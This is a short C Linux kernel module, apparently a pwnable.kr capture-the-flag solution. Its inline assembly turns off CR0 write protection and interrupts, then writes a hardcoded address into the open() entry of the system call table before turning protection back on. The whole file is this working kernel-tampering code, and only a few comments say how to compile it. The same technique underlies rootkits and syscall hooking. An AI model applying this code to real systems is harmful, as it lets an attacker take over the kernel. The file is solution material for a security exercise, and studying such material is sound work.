#include <linux/module.h>
#include <linux/kernel.h>

#define SYS_CALL_TABLE ((void**) 0xC15FA020)
#define SYS_OPEN 5
#define sys_open ((void**)0xC1158d70)

// Don't forget you have to compile this with the right Linux 3.7.1 headers.
// I had to download those locally for compiling it, instead of compiling on the pwnable.kr machine. I couldn't find a comiler on there :)

// Read about these control registers here: https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf
// And about the interrupt flags here: https://en.wikipedia.org/wiki/Interrupt_flag
int disable_write_protection() {
	__asm__ __volatile__(
        "cli;"
        "mov %cr0, %eax;"
        "and $0xFFFEFFFF, %eax;"
        "mov %eax, %cr0;"
    );

	return 0;
}

int enable_write_protection() {
	__asm__ __volatile__(
        "mov %cr0, %eax;"
        "or $0x10000, %eax;"
        "mov %eax, %cr0;"
        "sti;"
    );

	return 0;
}

int init_module() {
	disable_write_protection();
	SYS_CALL_TABLE[SYS_OPEN] = sys_open;
	enable_write_protection();
}

int cleanup_module() {

}

